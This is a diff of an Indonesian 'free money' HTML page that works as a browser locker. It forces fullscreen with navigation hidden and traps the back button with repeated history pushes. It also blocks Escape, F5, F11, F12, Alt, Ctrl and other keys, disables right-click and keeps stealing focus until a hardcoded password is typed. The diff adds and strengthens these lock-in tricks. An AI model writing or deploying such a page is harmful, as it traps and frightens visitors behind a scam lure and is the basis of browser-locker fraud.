@@ -1,9 +1,11 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
 <meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 <meta name="theme-color" content="#000000">
 <title>💰 UANG GRATIS!</title>
 <style>
@@ -22,7 +24,7 @@ html, body {
   inset: 0;
   width: 100%;
   height: 100%;
-  padding: 20px;
+  padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
 }
 
 .box {
@@ -219,9 +221,9 @@ html, body {
 const PASSWORD = "jangan345";
 const kotak = document.getElementById('kotak');
 
-function masukLayarPenuh() {
+// Fungsi sembunyikan navigasi
+function sembunyikanNav() {
   const elem = document.documentElement;
-  kotak.classList.add('merah');
   if (elem.requestFullscreen) {
     elem.requestFullscreen({ navigationUI: 'hide' }).catch(() => {});
   } else if (elem.webkitRequestFullscreen) {
@@ -229,7 +231,44 @@ function masukLayarPenuh() {
   }
 }
 
+// Blokir tombol kembali sementara
+window.addEventListener('popstate', () => {
+  history.pushState({ locked: true }, '', location.href);
+  history.go(1);
+});
+
+// Sembunyikan navigasi otomatis
+document.addEventListener('touchstart', sembunyikanNav);
+document.addEventListener('click', sembunyikanNav);
+document.addEventListener('mousemove', sembunyikanNav);
+
+// Blokir tombol yang mengganggu
+document.addEventListener('keydown', e => {
+  const dilarang = ['Escape','F11','F5','F12','AltLeft','AltRight','ControlLeft','ControlRight','Backspace'];
+  if (dilarang.includes(e.key) || e.altKey || e.ctrlKey || e.metaKey) {
+    e.preventDefault();
+    e.stopPropagation();
+    return false;
+  }
+}, true);
+
+document.addEventListener('contextmenu', e => e.preventDefault());
+
+function masukLayarPenuh() {
+  const elem = document.documentElement;
+  kotak.classList.add('merah');
+  sembunyikanNav();
+  if (elem.requestFullscreen) {
+    elem.requestFullscreen({ navigationUI: 'hide' }).catch(() => {});
+  } else if (elem.webkitRequestFullscreen) {
+    elem.webkitRequestFullscreen();
+  }
+  history.pushState({ locked: true }, '', location.href);
+}
+
 window.addEventListener('load', () => {
+  sembunyikanNav();
+  history.pushState({ locked: true }, '', location.href);
   if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 400]);
 });
 
@@ -259,34 +298,11 @@ function cek() {
   }
 }
 
-history.pushState({ locked: true }, '', location.href);
-history.pushState({ locked: true }, '', location.href);
-window.addEventListener('popstate', () => {
-  history.pushState({ locked: true }, '', location.href);
-  history.go(1);
-});
-
-window.addEventListener('beforeunload', e => {
-  e.preventDefault();
-  e.returnValue = '⚠️ Masih terkunci! Yakin mau keluar?';
-  return e.returnValue;
-});
-
-document.addEventListener('keydown', e => {
-  const dilarang = ['Escape','F11','F5','F12','AltLeft','AltRight','ControlLeft','ControlRight','w','W','t','T','n','N','r','R','Backspace'];
-  if (dilarang.includes(e.key) || e.altKey || e.ctrlKey || e.metaKey) {
-    e.preventDefault();
-    e.stopPropagation();
-    return false;
-  }
-}, true);
-
-document.addEventListener('contextmenu', e => e.preventDefault());
-
 setInterval(() => {
   const input = document.getElementById('pass');
   if (input && document.activeElement !== input) input.focus();
-}, 100);
+  sembunyikanNav();
+}, 500);
 </script>
 
 </body>
